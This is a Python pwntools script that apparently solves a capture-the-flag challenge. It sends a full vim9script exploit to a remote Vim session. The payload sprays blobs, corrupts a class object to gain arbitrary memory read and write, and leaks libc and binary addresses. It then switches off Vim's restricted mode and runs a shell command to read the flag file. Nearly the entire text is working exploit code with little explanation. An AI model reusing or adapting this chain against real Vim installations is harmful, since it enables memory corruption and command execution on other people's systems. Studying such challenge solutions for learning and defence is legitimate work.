from pwn import connect, context
import os

HOST = os.environ.get("HOST", "todo.challs.teamitaly.eu")
PORT = int(os.environ.get("PORT", 12321))

def main():
	context.log_level = "warning"
	r = connect(HOST, PORT)

	r.send(b"i")
	r.send(exploit)
	r.send(b"\x1b")  # ESC

	r.send(b":so\n")

	r.recvuntil(b"flag{")
	flag = (b"flag{" + r.recvuntil(b"}")).decode()
	print(flag)

	r.close()


exploit = b'''
vim9script

# size = 0x38

# BlobClass {
# 	class_T* obj_class
# 	int obj_refcount
# 	object_T* obj_next_used
# 	object_T* obj_prev_used
# 	int obj_copyID
#
# 	typval_T fields[]
# }
# struct typval_T {
# 	int v_type
# 	int v_lock
# 	void* vval
# }

# size = 0x28

# struct blob_T {
#	int ga_len
#	int ga_maxlen
#	int ga_itemsize
#	int ga_growsize
#	void* ga_data
#	int refcount
#	int bv_lock
# }

class BlobClass
	public this.b: blob
	def new()
	enddef
endclass

def Spray(): list<blob>
	var res: list<blob>
	for i in range(0x10)
		add(res, 0z4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141)
	endfor
	return res
enddef

def BlobToNumber(b: blob): number
	var res: number = 0
	for i in range(8)
		res = or((res << 8), b[0x8 - 1 - i])
	endfor
	return res
enddef

def NumberToBlob(num: number): blob
	var res: blob = 0z0000000000000000
	for i in range(8)
		res[i] = and(num >> (i << 3), 0xff)
	endfor
	return res
enddef

def Ref(obj: any)
enddef

def SetBlobPointer(b: blob, addr: number)
	b[0x30 : ] = NumberToBlob(addr)
enddef

def SetValidBlob(b: blob)
	b[0x00 : 0x07] = 0z3713000037130000  # ga_len, ga_maxlen
	b[0x08 : 0x0f] = 0z0100000064000000  # ga_itemsize, ga_growsize
	b[0x10 : 0x17] = 0z0000000000000000  # ga_data
	b[0x18 : 0x1f] = 0zffffff0000000000  # refcount, bv_lock
enddef

def SetBlobDataPtr(b: blob, addr: number)
	for i in range(8)
		b[0x10 + i] = and(addr >> (i << 3), 0xff)
	endfor
enddef

def ReadQWORD(blob_replace: blob, blob_o: BlobClass, where: number): number
	SetBlobDataPtr(blob_replace, where)
	var res: number = 0
	for i in range(8)
		res += blob_o.b[i] << (i << 3)
	endfor
	return res
enddef

def Pwn()
	var spray: list<blob> = Spray()

	var blob_o: BlobClass = BlobClass.new()
	Ref(blob_o)

	# size = 0x38
	# obj_class = NULL to improve stability, because `object_clear` doesn't free the object
	var obj_replace: blob = 0z0000000000000000.3713000000000000.41414141414141414141414141414141414141414141414141414141414141414141414141414141

	# replace last two qword of `obj_replace` with new blob
	# size = 0x28
	var blob_replace: blob = 0z41414141414141414141414141414141414141414141414141414141414141414141414141414141
	blob_o.b = blob_replace

	# `obj_replace[-0x8 :]` will contain the `blob_T` pointer
	var blob_address: number = BlobToNumber(obj_replace[-0x8 :])
	echo printf("blob_address   ---> %#018x\\n", blob_address)

	SetBlobPointer(obj_replace, blob_address + 0x10)
	var blob_data_address_low: number = and(len(blob_o.b), 0xffffffff)
	var blob_data_address_high: number = blob_address >> 32
	var blob_data_address: number = or(blob_data_address_low, blob_data_address_high << 32)
	echo printf("blob_data      ---> %#018x\\n", blob_data_address)

	SetValidBlob(blob_replace)
	SetBlobPointer(obj_replace, blob_data_address)

	if len(blob_o.b) != 0x1337
		echo "NO ARBITRARY BLOB"
		return
	endif

	var libc_leak: number = -1
	for i in range(blob_address - 0x10000, blob_address, 8)
		var maybe_libc: number = ReadQWORD(blob_replace, blob_o, i)
		if and(maybe_libc >> 40, 0xff) == 0x7f || and(maybe_libc >> 40, 0xff) == 0x7e
			if and(maybe_libc, 0xfff) == 0xc00
				libc_leak = maybe_libc
				break
			endif
		endif
	endfor

	if libc_leak == -1
		echo "CANNOT LEAK"
		return
	endif

	var libc_address: number = libc_leak - 0x219c00
	echo printf("libc_leak      ---> %#018x\\n", libc_leak)
	echo printf("libc           ---> %#018x\\n", libc_address)

	var stdout_ptr: number = libc_address + 0x218e38
	var binary_leak = ReadQWORD(blob_replace, blob_o, stdout_ptr)
	var binary_address: number = binary_leak - 0x379568
	var restricted_address: number = binary_address + 0x384638
	echo printf("binary_leak    ---> %#018x\\n", binary_leak)
	echo printf("binary         ---> %#018x\\n", binary_address)

	SetBlobDataPtr(blob_replace, restricted_address)
	blob_o.b[0] = 0

	!cat /flag

	input("End")
enddef

defcompile

Pwn()
'''

if __name__ == "__main__":
	main()
